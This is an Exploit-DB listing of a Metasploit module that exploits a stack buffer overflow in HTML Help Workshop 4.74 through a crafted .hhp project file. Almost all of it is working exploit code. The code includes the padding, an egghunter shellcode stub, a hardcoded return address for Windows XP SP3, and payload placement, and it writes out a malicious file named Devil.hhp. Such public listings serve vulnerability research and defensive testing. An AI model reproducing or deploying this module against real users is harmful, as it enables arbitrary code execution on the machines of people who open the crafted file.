# Title: HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit (Meta)
# EDB-ID: 10335
# CVE-ID: ()
# OSVDB-ID: ()
# Author: loneferret
# Published: 2009-12-07
# Verified: yes
# Download Exploit Code
# Download Vulnerable app

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
         
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit',
            'Description'    => %q{
                    This module exploits a stack overflow in HTML Help Workshop 4.74
                    By creating a specially crafted hhp file, an an attacker may be able
                    to execute arbitrary code.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [ 'loneferret, original by Encrypt3d.M!nd' ],
            'Version'        => '$Revision: 7724 $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/10321' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },                 
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00",
                    'StackAdjustment' => -4800,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP English SP3', { 'Ret' => 0x00401F93 } ], # CALL EDI  \x93\x1f\x40\x00
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Dec 05 2009',
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new('FILENAME',   [ false, 'The file name.',  'Devil.hhp']),
                ], self.class)
 
    end
 
    def exploit
 
        sploit = "\x5B\x4F\x50\x54\x49\x4F\x4E\x53\x5D\x0D\x0A\x43\x6F\x6E\x74\x65"
        sploit << "\x6E\x74\x73\x20\x66\x69\x6C\x65\x3D\x41\x0D\x0A\x49\x6E\x64\x65\x78\x20\x66\x69\x6C\x65\x3D"
        sploit << "\x41" * 224
        sploit << "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x69\x72\x61\x71\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        sploit << "\x42" * 24
        sploit << [target.ret].pack('V')
        sploit << "\x0d\x0a\x0d\x0a"
        sploit << "\x5B\x46\x49\x4C\x45\x53\x5D\x0D"
        sploit << "\x0d\x0a"
        sploit << "\x41" * 16
        sploit << "\x69\x72\x61\x71\x69\x72\x61\x71"
        sploit << payload.encoded
        sploit << "\x41" * 4000
  
        hhp = sploit
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(hhp)
    end
 
end

